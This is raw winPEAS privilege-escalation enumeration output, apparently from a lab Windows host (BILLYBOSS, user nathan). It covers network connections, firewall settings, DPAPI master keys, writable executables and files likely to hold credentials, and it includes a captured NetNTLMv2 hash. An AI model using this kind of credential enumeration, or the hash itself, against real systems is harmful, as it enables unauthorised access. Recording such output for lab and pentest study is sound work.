+  TCP        127.0.0.1             49670         0.0.0.0               0               Listening         2100            C:\Users\nathan\Nexus\nexus-3.21.0-05\bin\nexus.exe
+  TCP        127.0.0.1             49674         127.0.0.1             49675           Established       2100            C:\Users\nathan\Nexus\nexus-3.21.0-05\bin\nexus.exe
+  TCP        127.0.0.1             49675         127.0.0.1             49674           Established       2100            C:\Users\nathan\Nexus\nexus-3.21.0-05\bin\nexus.exe
+  TCP        192.168.98.61         139           0.0.0.0               0               Listening         4               System
+  TCP        192.168.98.61         8081          192.168.49.98         42026           Time Wait         0               Idle
+  TCP        192.168.98.61         8081          192.168.49.98         42028           Time Wait         0               Idle
+  TCP        192.168.98.61         8081          192.168.49.98         42030           Time Wait         0               Idle
+  TCP        192.168.98.61         8081          192.168.49.98         42032           Time Wait         0               Idle
+  TCP        192.168.98.61         8081          192.168.49.98         42034           Time Wait         0               Idle
+  TCP        192.168.98.61         8081          192.168.49.98         42036           Time Wait         0               Idle
+  TCP        192.168.98.61         8081          192.168.49.98         42038           Time Wait         0               Idle
+  TCP        192.168.98.61         8081          192.168.49.98         42040           Time Wait         0               Idle
+  TCP        192.168.98.61         8081          192.168.49.98         42042           Time Wait         0               Idle
+  TCP        192.168.98.61         8081          192.168.49.98         42044           Time Wait         0               Idle
+  TCP        192.168.98.61         8081          192.168.49.98         42046           Time Wait         0               Idle
+  TCP        192.168.98.61         8081          192.168.49.98         42048           Time Wait         0               Idle
+  TCP        192.168.98.61         8081          192.168.49.98         42050           Time Wait         0               Idle
+  TCP        192.168.98.61         8081          192.168.49.98         42052           Time Wait         0               Idle
+  TCP        192.168.98.61         8081          192.168.49.98         42054           Time Wait         0               Idle
+  TCP        192.168.98.61         8081          192.168.49.98         42056           Time Wait         0               Idle
+  TCP        192.168.98.61         8081          192.168.49.98         42058           Time Wait         0               Idle
+  TCP        192.168.98.61         8081          192.168.49.98         42060           Time Wait         0               Idle
+  TCP        192.168.98.61         8081          192.168.49.98         42062           Time Wait         0               Idle
+  TCP        192.168.98.61         8081          192.168.49.98         42064           Time Wait         0               Idle
+  TCP        192.168.98.61         8081          192.168.49.98         42066           Time Wait         0               Idle
+  TCP        192.168.98.61         8081          192.168.49.98         42068           Time Wait         0               Idle
+  TCP        192.168.98.61         8081          192.168.49.98         42070           Time Wait         0               Idle
+  TCP        192.168.98.61         8081          192.168.49.98         42072           Time Wait         0               Idle
+  TCP        192.168.98.61         49829         192.168.49.98         21              Established       4424            C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+
+  Enumerating IPv6 connections
+
+  Protocol   Local Address                               Local Port    Remote Address                              Remote Port     State             Process ID      Process Name
+
+  TCP        [::]                                        21            [::]                                        0               Listening         1848            svchost
+  TCP        [::]                                        80            [::]                                        0               Listening         4               System
+  TCP        [::]                                        135           [::]                                        0               Listening         812             svchost
+  TCP        [::]                                        445           [::]                                        0               Listening         4               System
+  TCP        [::]                                        49664         [::]                                        0               Listening         592             lsass
+  TCP        [::]                                        49665         [::]                                        0               Listening         492             wininit
+  TCP        [::]                                        49666         [::]                                        0               Listening         272             svchost
+  TCP        [::]                                        49667         [::]                                        0               Listening         784             svchost
+  TCP        [::]                                        49668         [::]                                        0               Listening         1540            spoolsv
+  TCP        [::]                                        49669         [::]                                        0               Listening         584             services
+
+  [+] Current UDP Listening Ports
+   [?] Check for services restricted from the outside
+  Enumerating IPv4 connections
+
+  Protocol   Local Address         Local Port    Remote Address:Remote Port     Process ID        Process Name
+
+  UDP        0.0.0.0               123           *:*                            3976              svchost
+  UDP        0.0.0.0               500           *:*                            784               svchost
+  UDP        0.0.0.0               4500          *:*                            784               svchost
+  UDP        0.0.0.0               5050          *:*                            996               svchost
+  UDP        0.0.0.0               5353          *:*                            580               svchost
+  UDP        0.0.0.0               5355          *:*                            580               svchost
+  UDP        127.0.0.1             1900          *:*                            3812              svchost
+  UDP        127.0.0.1             57987         *:*                            784               svchost
+  UDP        127.0.0.1             63767         *:*                            3812              svchost
+  UDP        192.168.98.61         137           *:*                            4                 System
+  UDP        192.168.98.61         138           *:*                            4                 System
+  UDP        192.168.98.61         1900          *:*                            3812              svchost
+  UDP        192.168.98.61         63766         *:*                            3812              svchost
+
+  Enumerating IPv6 connections
+
+  Protocol   Local Address                               Local Port    Remote Address:Remote Port     Process ID        Process Name
+
+  UDP        [::]                                        123           *:*                            3976              svchost
+  UDP        [::]                                        500           *:*                            784               svchost
+  UDP        [::]                                        4500          *:*                            784               svchost
+  UDP        [::1]                                       1900          *:*                            3812              svchost
+  UDP        [::1]                                       63765         *:*                            3812              svchost
+
+  [+] Firewall Rules
+   [?] Showing only DENY rules (too many ALLOW rules always)
+    Current Profiles: PUBLIC
+    FirewallEnabled (Domain):    True
+    FirewallEnabled (Private):    True
+    FirewallEnabled (Public):    True
+    DENY rules:
+
+  [+] DNS cached --limit 70--
+    Entry                                 Name                                  Data
+
+  [+] Enumerating Internet settings, zone and proxy configuration
+  General Settings
+  Hive        Key                                       Value
+  HKCU        DisableCachingOfSSLPages                  0
+  HKCU        IE5_UA_Backup_Flag                        5.0
+  HKCU        PrivacyAdvanced                           1
+  HKCU        SecureProtocols                           2688
+  HKCU        User Agent                                Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+  HKCU        CertificateRevocation                     1
+  HKCU        ZonesSecurityUpgrade                      System.Byte[]
+  HKCU        WarnonZoneCrossing                        0
+  HKCU        EnableNegotiate                           1
+  HKCU        MigrateProxy                              1
+  HKCU        ProxyEnable                               0
+  HKCU        LockDatabase                              132348964719060600
+  HKLM        ActiveXCache                              C:\Windows\Downloaded Program Files
+  HKLM        CodeBaseSearchPath                        CODEBASE
+  HKLM        EnablePunycode                            1
+  HKLM        MinorVersion                              0
+  HKLM        WarnOnIntranet                            1
+
+  Zone Maps
+  No URLs configured
+
+  Zone Auth Settings
+  No Zone Auth Settings
+
+
+  =========================================(Windows Credentials)=========================================
+
+  [+] Checking Windows Vault
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault
+    Not Found
+
+  [+] Checking Credential manager
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault
+    [!] Warning: if password contains non-printable characters, it will be printed as unicode base64 encoded string
+
+
+  [X] Exception: Failed to enumerate credentials
+
+  [+] Saved RDP connections
+    Not Found
+
+  [+] Remote Desktop Server/Client Settings
+  RDP Server Settings
+    Network Level Authentication            :
+    Block Clipboard Redirection             :
+    Block COM Port Redirection              :
+    Block Drive Redirection                 :
+    Block LPT Port Redirection              :
+    Block PnP Device Redirection            :
+    Block Printer Redirection               :
+    Allow Smart Card Redirection            :
+
+  RDP Client Settings
+    Disable Password Saving                 :       True
+    Restricted Remote Administration        :       False
+
+  [+] Recently run commands
+    Not Found
+
+  [+] Checking for DPAPI Master Keys
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
+    MasterKey: C:\Users\nathan\AppData\Roaming\Microsoft\Protect\S-1-5-21-2389609380-2620298947-1153829925-1001\3fdc23fa-40fb-45b8-85e9-bc3866ecf130
+    Accessed: 7/3/2021 5:05:58 AM
+    Modified: 7/3/2021 5:05:58 AM
+   =================================================================================================
+
+    MasterKey: C:\Users\nathan\AppData\Roaming\Microsoft\Protect\S-1-5-21-2389609380-2620298947-1153829925-1001\5ba95ab4-4e91-4807-b725-4804308215db
+    Accessed: 7/3/2021 5:05:58 AM
+    Modified: 5/25/2020 9:06:08 AM
+   =================================================================================================
+
+
+  [+] Checking for DPAPI Credential Files
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
+    Not Found
+
+  [+] Checking for RDCMan Settings Files
+   [?] Dump credentials from Remote Desktop Connection Manager https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#remote-desktop-credential-manager
+    Not Found
+
+  [+] Looking for Kerberos tickets
+   [?]  https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88
+    Not Found
+
+  [+] Looking for saved Wifi credentials
+  [X] Exception: The service has not been started
+
+  [+] Looking AppCmd.exe
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#appcmd-exe
+    AppCmd.exe was found in C:\Windows\system32\inetsrv\appcmd.exe
+      You must be an administrator to run this check
+
+  [+] Looking SSClient.exe
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#scclient-sccm
+    Not Found
+
+  [+] Enumerating SSCM - System Center Configuration Manager settings
+
+  [+] Enumerating Security Packages Credentials
+  Version: NetNTLMv2
+  Hash:    nathan::BILLYBOSS:1122334455667788:aeb670cee626a1bd761e3e40e67a3d9e:010100000000000075bbd2d90370d701be9edd171b120a39000000000800300030000000000000000000000000300000d4849b579c2c4771f737b9806bc787f24b892f7f78a81b086694e411a24f49de0a00100000000000000000000000000000000000090000000000000000000000
+
+   =================================================================================================
+
+
+
+  ========================================(Browsers Information)========================================
+
+  [+] Showing saved credentials for Firefox
+    Info: if no credentials were listed, you might need to close the browser and try again.
+
+  [+] Looking for Firefox DBs
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
+    Not Found
+
+  [+] Looking for GET credentials in Firefox history
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
+    Not Found
+
+  [+] Showing saved credentials for Chrome
+    Info: if no credentials were listed, you might need to close the browser and try again.
+
+  [+] Looking for Chrome DBs
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
+    Not Found
+
+  [+] Looking for GET credentials in Chrome history
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
+    Not Found
+
+  [+] Chrome bookmarks
+    Not Found
+
+  [+] Showing saved credentials for Opera
+    Info: if no credentials were listed, you might need to close the browser and try again.
+
+  [+] Showing saved credentials for Brave Browser
+    Info: if no credentials were listed, you might need to close the browser and try again.
+
+  [+] Showing saved credentials for Internet Explorer (unsupported)
+    Info: if no credentials were listed, you might need to close the browser and try again.
+
+  [+] Current IE tabs
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
+  [X] Exception: System.Reflection.TargetInvocationException: Exception has been thrown by the target of an invocation. ---> System.Runtime.InteropServices.COMException: The server process could not be started because the configured identity is incorrect. Check the username and password.
+
+   --- End of inner exception stack trace ---
+   at System.RuntimeType.InvokeDispMethod(String name, BindingFlags invokeAttr, Object target, Object[] args, Boolean[] byrefModifiers, Int32 culture, String[] namedParameters)
+   at System.RuntimeType.InvokeMember(String name, BindingFlags bindingFlags, Binder binder, Object target, Object[] providedArgs, ParameterModifier[] modifiers, CultureInfo culture, String[] namedParams)
+   at ew.l()
+    Not Found
+
+  [+] Looking for GET credentials in IE history
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
+
+  [+] IE favorites
+    http://go.microsoft.com/fwlink/p/?LinkId=255142
+
+
+  ==============================(Interesting files and registry)==============================
+
+  [+] Putty Sessions
+    Not Found
+
+  [+] Putty SSH Host keys
+    Not Found
+
+  [+] SSH keys in registry
+   [?] If you find anything here, follow the link to learn how to decrypt the SSH keys https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#ssh-keys-in-registry
+    Not Found
+
+  [+] SuperPutty configuration files
+
+  [+] Enumerating Office 365 endpoints synced by OneDrive.
+
+    SID: S-1-5-19
+   =================================================================================================
+
+    SID: S-1-5-20
+   =================================================================================================
+
+    SID: S-1-5-21-2389609380-2620298947-1153829925-1001
+      Name:  Personal
+        UserFolder                                 C:\Users\nathan\OneDrive
+   =================================================================================================
+
+    SID: S-1-5-82-1873293425-3523346259-1208777527-3325800384-2130604408
+   =================================================================================================
+
+    SID: S-1-5-18
+   =================================================================================================
+
+
+  [+] Cloud Credentials
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
+    Not Found
+
+  [+] Unattend Files
+
+  [+] Looking for common SAM & SYSTEM backups
+
+  [+] Looking for McAfee Sitelist.xml Files
+
+  [+] Cached GPP Passwords
+
+  [+] Looking for possible regs with creds
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#inside-the-registry
+    Not Found
+    Not Found
+    Not Found
+    Not Found
+
+  [+] Looking for possible password files in users homes
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
+    C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
+
+  [+] Searching for Oracle SQL Developer config files
+
+
+  [+] Slack files & directories
+  note: check manually if something is found
+
+  [+] Looking for LOL Binaries and Scripts (can be slow)
+   [?]  https://lolbas-project.github.io/
+   [!] Check skipped, if you want to run it, please specify '-lolbas' argument
+
+  [+] Enumerating Outlook download files
+
+
+  [+] Enumerating machine and user certificate files
+
+
+  [+] Searching known files that can contain creds in home
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
+    C:\Users\nathan\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalState\dtlskey.der
+    C:\Users\nathan\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalState\dtlscert.der
+    C:\Users\nathan\NTUSER.DAT
+    C:\Users\nathan\Nexus\nexus-3.21.0-05\etc\fabric\elasticsearch.yml
+    C:\Users\nathan\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+  [+] Looking for documents --limit 100--
+    Not Found
+
+  [+] Office Most Recent Files -- limit 50
+
+  Last Access Date           User                                           Application           Document
+
+  [+] Recent files --limit 70--
+    Not Found
+
+  [+] Looking inside the Recycle Bin for creds files
+   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
+    Not Found
+
+  [+] Searching hidden files or folders in C:\Users home (can be slow)
+
+     C:\Users\All Users\ntuser.pol
+
+  [+] Searching interesting files in other users home directories (can be slow)
+
+     Checking folder: c:\users\administrator
+
+   =================================================================================================
+
+
+  [+] Searching executable files in non-default folders with write (equivalent) permissions (can be slow)
+     File Permissions "C:\BaGet\BaGet.exe": Authenticated Users [WriteData/CreateFiles]
+     File Permissions "C:\Users\nathan\Downloads\winPEASany.exe": nathan [AllAccess]
+     File Permissions "C:\Users\nathan\Downloads\PrivescCheck.ps1": nathan [AllAccess]
+     File Permissions "C:\Users\nathan\Downloads\PowerUp.ps1": nathan [AllAccess]
+     File Permissions "C:\Users\nathan\AppData\Local\Microsoft\WindowsApps\python3.exe": nathan [AllAccess]
+     File Permissions "C:\Users\nathan\AppData\Local\Microsoft\WindowsApps\python.exe": nathan [AllAccess]
+     File Permissions "C:\Users\nathan\AppData\Local\Microsoft\WindowsApps\MicrosoftEdge.exe": nathan [AllAccess]
+     File Permissions "C:\Users\nathan\AppData\Local\Microsoft\WindowsApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdge.exe": nathan [AllAccess]
+     File Permissions "C:\Users\nathan\AppData\Local\Microsoft\WindowsApps\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\python3.exe": nathan [AllAccess]
+     File Permissions "C:\Users\nathan\AppData\Local\Microsoft\WindowsApps\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\python3.7.exe": nathan [AllAccess]
+     File Permissions "C:\Users\nathan\AppData\Local\Microsoft\WindowsApps\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\python.exe": nathan [AllAccess]
+     File Permissions "C:\Users\nathan\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe": nathan [AllAccess]
+     File Permissions "C:\Users\nathan\AppData\Local\Microsoft\OneDrive\OneDrive.exe": nathan [AllAccess]
+
+  [+] Looking for Linux shells/distributions - wsl.exe, bash.exe
+
+       /---------------------------------------------------------------------------\
+       |                             Do you like PEASS?                            |
+       |---------------------------------------------------------------------------|
+       |         Become a Patreon    :     https://www.patreon.com/peass           |
+       |         Follow on Twitter   :     @carlospolopm                           |
+       |---------------------------------------------------------------------------|
+       |                                 Thank you!                                |
+       \---------------------------------------------------------------------------/
